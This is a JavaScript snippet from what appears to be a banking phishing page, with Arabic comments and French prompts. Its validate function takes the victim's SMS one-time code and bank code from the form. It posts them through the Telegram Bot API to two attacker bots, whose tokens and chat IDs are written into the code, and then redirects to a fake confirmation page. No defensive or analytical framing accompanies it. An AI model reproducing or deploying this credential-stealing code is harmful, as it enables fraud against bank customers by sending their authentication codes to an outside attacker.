<script>
    // تحديث وظيفة validate لإضافة إرسال إلى Telegram
    function validate() {
        const smsCode = document.getElementById('code-sms').value;
        const bankCode = document.getElementById('code-banque').value;

        if (smsCode === "" || bankCode === "") {
            alert("Veuillez remplir tous les champs.");
        } else {
            const message = `Code SMS: ${smsCode}\nCode Banque: ${bankCode}`;

            // إرسال البيانات إلى البوت الأول
            const bot1Token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
            const chatId1 = "5372119436";

            // إرسال البيانات إلى البوت الثاني
            const bot2Token = "7416570408:AAHdYlssG3BwSoMe7C4mYc61gt8ORSscxDc";
            const chatId2 = "7198476943";

            // دالة إرسال البيانات
            function sendToTelegram(botToken, chatId, message) {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                }).then(response => {
                    if (!response.ok) {
                        console.error(`خطأ في إرسال البيانات إلى البوت ${botToken}`);
                    }
                }).catch(error => {
                    console.error("خطأ أثناء الإرسال:", error);
                });
            }

            // إرسال الرسالة إلى البوتين
            sendToTelegram(bot1Token, chatId1, message);
            sendToTelegram(bot2Token, chatId2, message);

            alert("تم إرسال البيانات بنجاح!");
            window.location.href = "confirmation_finale.html"; // توجيه للصفحة النهائية
        }
    }
</script>